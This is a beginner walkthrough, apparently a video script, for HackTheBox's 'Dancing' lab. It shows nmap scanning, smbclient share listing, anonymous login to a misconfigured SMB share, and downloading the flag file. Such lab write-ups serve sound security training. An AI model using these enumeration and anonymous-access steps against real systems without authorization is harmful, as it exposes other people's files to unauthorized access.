## Dancing: HackTheBox Starting Point Walkthrough

**Intro**

What's up, hackers! Back again with Ctrl Alt Hack, and this time we're breaking down "Dancing", the third box in HackTheBox's Starting Point. This one's all about the Server Message Block (SMB) protocol, which is used for sharing files and resources across a network. It's a Windows thing, and sometimes it's not configured as securely as it should be. We'll show you how to exploit that and grab the flag!

**Enumeration**

As always, let's start with `ping` to make sure our target is up:

```bash
ping <target_IP>
```

Target acquired! Now, let's `nmap` it to see what ports are open:

```bash
sudo nmap -sV <target_IP>
```

We're looking for port 445, which is where SMB usually runs. Bingo! We see it open and running a Windows service.

**Exploitation**

To play with SMB, we need the `smbclient` utility. If you don't have it, install it with:

```bash
sudo apt-get install smbclient
```

Now, let's see what shares are available on the target:

```bash
smbclient -L <target_IP>
```

This will show us a list of shares. We're interested in ones that might let us in without a password.

Try connecting to each share anonymously. For example, if you see a share called "WorkShares", try this:

```bash
smbclient //<target_IP>/WorkShares
```

When it asks for a password, just hit enter. If you get in, you've found a misconfigured share!

Once you're in, use `ls` or `dir` to list the files and directories. You might have to poke around a bit, but keep an eye out for a file named `flag.txt`.

When you find it, use the `get` command to download it:

```
get flag.txt
```

Then, type `exit` to leave the SMB shell.

**Claiming the Flag**

Back on your own machine, you should have the `flag.txt` file. Use `cat` to view the flag:

```bash
cat flag.txt
```

There it is! Copy that flag and submit it on HackTheBox. You've conquered Dancing!

**Outro**

Another box down! Weak SMB configurations are a common way for attackers to get a foothold, so remember what you've learned here. If you enjoyed this walkthrough, hit that like button, subscribe to Ctrl Alt Hack, and ring the bell for more hacking goodness. Catch you in the next one!